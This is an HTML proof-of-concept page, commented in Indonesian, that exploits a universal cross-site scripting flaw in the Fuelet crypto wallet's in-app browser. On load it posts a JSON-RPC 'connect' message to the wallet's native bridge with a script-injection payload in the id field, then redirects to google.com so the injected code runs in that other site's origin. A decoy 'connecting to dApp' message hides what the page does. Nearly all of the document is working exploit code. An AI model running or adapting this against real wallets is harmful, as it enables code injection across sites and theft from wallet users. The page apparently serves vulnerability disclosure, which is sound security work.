<!DOCTYPE html>
<html>
<head>
    <title>PoC UXSS Fuelet</title>
</head>
<body>
    <h1>Menghubungkan ke dApp...</h1>
    <p>Jika tidak berpindah otomatis, <button onclick="runExploit()">Klik di sini</button></p>

    <script>
        function runExploit() {
            // Payload ini dirancang untuk:
            // 1. Menutup argumen pertama fungsi: ")
            // 2. Menjalankan alert: ;alert(origin);
            // 3. Menetralkan sisa kode setelahnya dengan comment: //
            const payloadId = '");alert("Kena XSS di: " + location.origin);//';

            const requestData = {
                type: 'request',
                target: 'FuelContentScript',
                connectorName: 'Fuelet Wallet',
                request: {
                    jsonrpc: '2.0',
                    id: payloadId,
                    method: 'connect',
                    params: {}
                }
            };

            // LANGKAH 1: Kirim pesan ke Native (Flutter)
            if (window.FueletWallet) {
                window.FueletWallet.postMessage(JSON.stringify(requestData));
                
                // LANGKAH 2: Segera pindah ke domain target (korban)
                // Kita beri jeda 100ms agar postMessage selesai diproses oleh sistem
                setTimeout(() => {
                    window.location.href = 'https://google.com';
                }, 100);
            } else {
                alert("Objek FueletWallet tidak ditemukan. Buka di browser dompet!");
            }
        }

        // Jalankan otomatis saat halaman dimuat
        window.onload = runExploit;
    </script>
</body>
</html>
